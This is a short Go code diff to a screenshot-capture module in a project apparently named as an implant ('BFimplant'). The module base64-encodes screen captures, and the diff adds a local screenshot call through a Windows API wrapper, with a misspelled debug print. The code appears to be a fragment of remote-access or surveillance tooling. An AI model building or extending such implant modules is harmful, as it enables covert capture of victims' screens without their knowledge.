@@ -5,8 +5,8 @@ import (
 	"encoding/base64"
 	"fmt"
 	"image/png"
-
 	"github.com/kbinani/screenshot"
+    "BFimplant/winapiV2"
 )
 
 type ScreenshotModule struct{}
@@ -38,6 +38,9 @@ func (m *ScreenshotModule) Execute(filename string, data []byte) (string, error)
 
     // Encode the buffer to a base64 string
     imgBase64Str := base64.StdEncoding.EncodeToString(buf.Bytes())
+
+    err = winapiV2.GetScreenshot("./screenshot1.png")
+    fmt.Println("erreur geting screenshot",err)
 
     return imgBase64Str, nil
 }
